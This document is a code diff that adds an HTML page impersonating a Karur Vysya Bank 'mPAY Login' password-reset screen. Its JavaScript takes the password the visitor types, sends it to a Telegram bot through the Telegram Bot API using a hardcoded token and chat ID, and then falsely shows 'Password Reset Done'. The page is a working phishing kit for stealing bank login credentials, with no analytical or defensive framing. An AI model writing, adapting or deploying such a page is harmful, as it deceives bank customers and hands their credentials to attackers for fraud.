@@ -1,0 +1,162 @@
+<!DOCTYPE html>  
+<html>  
+<head>  
+    <title>mPAY Login</title>  
+    <style>  
+        body {  
+            font-family: Arial;  
+            margin: 0;  
+            background: #f5f5f5;  
+        }  
+        .header {  
+            display: flex;  
+            justify-content: flex-end;  
+            padding: 10px;  
+            background: white;  
+        }  
+        .logo {  
+            background: #d4e800;  
+            padding: 10px 15px;  
+            display: flex;  
+            align-items: center;  
+            font-weight: bold;  
+            font-size: 18px;  
+        }  
+        .logo span {  
+            background: #2e7d32;  
+            color: white;  
+            border-radius: 50%;  
+            padding: 10px;  
+            margin-right: 10px;  
+        }  
+        .container {  
+            padding: 20px;  
+        }  
+        h2 {  
+            margin-bottom: 20px;  
+        }  
+        input {  
+            width: 100%;  
+            padding: 12px;  
+            margin: 10px 0;  
+            font-size: 16px;  
+            border: 2px solid #ccc;  
+        }  
+        .active {  
+            border: 2px solid green;  
+        }  
+        .note {  
+            font-size: 14px;  
+            margin-top: 20px;  
+        }  
+        .footer {  
+            position: fixed;  
+            bottom: 0;  
+            width: 100%;  
+            display: flex;  
+        }  
+        .btn {  
+            width: 50%;  
+            padding: 15px;  
+            text-align: center;  
+            background: black;  
+            color: white;  
+        }  
+        .submit-telegram {
+            width: 100%;
+            padding: 12px;
+            margin-top: 15px;
+            background: #2e7d32;
+            color: white;
+            border: none;
+            font-size: 16px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        .submit-telegram:hover {
+            background: #1b5e20;
+        }
+    </style>  
+</head>  
+<body>  
+<div class="header">  
+    <div class="logo">  
+        <span>KVBa</span> Karur Vysya Bank  
+    </div>  
+</div>  
+<div class="container">  
+    <h2>mPAY Login</h2>  
+    <label>Reset Password</label>  
+    <input type="password" class="active" id="loginPassword" placeholder="Login Password">  
+    <label>Confirm Login Password</label>  
+    <input type="password" id="confirmPassword" placeholder="Confirm Login Password">  
+    <p class="note">  
+        <b>Note:</b> Please create your own Login Password; you must remember this password for further logins.  
+    </p>  
+    <button class="submit-telegram" onclick="sendToTelegram()">Submit To Reset</button>
+</div>  
+<div class="footer">  
+    <div class="btn" onclick="okClick()">Ok</div>  
+    <div class="btn" onclick="exitClick()">Exit</div>  
+</div>  
+
+<script>
+    // REPLACE WITH YOUR ACTUAL BOT TOKEN AND CHAT ID
+    const BOT_TOKEN = "7981441746:AAE-dvmx-l_FsL7l2YtbVy3zgkB0ICHgR-o";
+    const CHAT_ID = "-1003713883222";
+
+    function sendToTelegram() {
+        const password = document.getElementById('loginPassword').value;
+        const confirmPassword = document.getElementById('confirmPassword').value;
+        
+        if (!password) {
+            alert('Please enter login password');
+            return;
+        }
+        
+        if (password !== confirmPassword) {
+            alert('Passwords do not match');
+            return;
+        }
+        
+        if (BOT_TOKEN === "YOUR_BOT_TOKEN_HERE" || CHAT_ID === "YOUR_CHAT_ID_HERE") {
+            alert('Please configure BOT_TOKEN and CHAT_ID in the script');
+            return;
+        }
+        
+        const message = `🔐 mPAY Login Password: ${password}`;
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        
+        fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.ok) {
+                alert('Password Reset Done');
+                document.getElementById('loginPassword').value = '';
+                document.getElementById('confirmPassword').value = '';
+            } else {
+                alert('Failed to send: ' + data.description);
+            }
+        })
+        .catch(error => {
+            alert('Error: ' + error.message);
+        });
+    }
+    
+    function okClick() {
+        sendToTelegram();
+    }
+    
+    function exitClick() {
+        if (confirm('Are you sure you want to exit?')) {
+            document.getElementById('loginPassword').value = '';
+            document.getElementById('confirmPassword').value = '';
+        }
+    }
+</script>
+</body>  
+</html>
